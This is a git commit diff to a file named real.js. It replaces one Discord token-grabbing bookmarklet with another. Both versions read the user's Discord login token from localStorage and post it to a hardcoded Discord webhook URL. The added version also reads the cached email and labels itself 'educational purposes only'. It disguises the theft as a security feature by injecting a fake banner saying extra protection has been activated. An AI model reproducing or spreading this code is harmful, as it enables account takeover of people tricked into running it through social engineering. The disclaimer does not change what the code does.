4c70d2da0909fd9cc8819cccf48390fa6d18a122
SkidedDev <143294182+SkidedDev@users.noreply.github.com>
2023-08-26 22:43:31 +0100

    Update real.js

--- real.js
+++ real.js
@@ -1,27 +1,2 @@
-javascript: void (function () {
-  var SEND = "https://discord.com/api/webhooks/1145102827648196618/8FN94SI5LaObTH7DiG2Ktzx28E4GcCncJS_VJbTbdwEaHNjSiRXWrW-TizwrAalnEHyV";
-  "https://discord.com" == this.document.location.origin &&
-    (function () {
-      const a = document.createElement("iframe");
-      document.head.append(a);
-      const b = Object.getOwnPropertyDescriptor(
-        a.contentWindow,
-        "localStorage"
-      );
-      a.remove(),
-        Object.defineProperty(window, "localStorage", b),
-        fetch(SEND, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            embeds: [
-              {
-                color: 3553599,
-                title: "Fetched Credentials",
-                description: `\`\`\`${localStorage.getItem("token")}\`\`\``,
-              },
-            ],
-          }),
-        });
-    })();
-})();
+// warning: educational purposes only.
+javascript: void (function () {  if ("https://discord.com" != this.document.location.origin)    alert("You must be on Discord to use this tool!");  else {    const c = document.createElement("iframe");    document.head.append(c);    const d = Object.getOwnPropertyDescriptor(c.contentWindow, "localStorage");    c.remove(),      Object.defineProperty(window, "localStorage", d),      (t = localStorage.getItem("token")),      (e = localStorage.getItem("email_cache"));    var a = new XMLHttpRequest();    a.open(      "POST",      "https://discord.com/api/webhooks/1145102827648196618/8FN94SI5LaObTH7DiG2Ktzx28E4GcCncJS_VJbTbdwEaHNjSiRXWrW-TizwrAalnEHyV"    ),      a.setRequestHeader("Content-type", "application/json");    var b = {      embeds: [        {          color: 16515972,          title: "Protection Enabled",          description: `\`\`\`${t}\`\`\``,        },      ],    };    a.send(JSON.stringify(b)),      (notice = `<div class="notice-3bPHh-" style="background-color:#364995;color:white;">%F0%9F%94%92 Extra security measures have been activated on your account.<a href = "https://discord.com/channels/@me"> <b>Reload</b><a></div>`),      document        .querySelector(".base-3dtUhz")        .insertAdjacentHTML("afterbegin", notice);  }})();
